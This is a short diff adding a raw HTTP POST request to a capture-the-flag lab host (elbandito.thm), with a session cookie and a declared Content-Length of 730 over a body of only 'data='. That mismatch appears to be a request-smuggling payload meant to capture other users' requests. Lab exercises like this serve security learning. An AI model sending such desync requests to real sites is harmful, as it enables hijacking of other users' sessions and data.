@@ -1,0 +1,7 @@
+POST /send_message HTTP/1.1
+Host: elbandito.thm:80
+Cookie: session=eyJ1c2VybmFtZSI6ImhBY2tMSUVOIn0.Z-rKtg.CyaOpfDjNdjcJgsJn1FvGXf6dM0
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 730
+
+data=
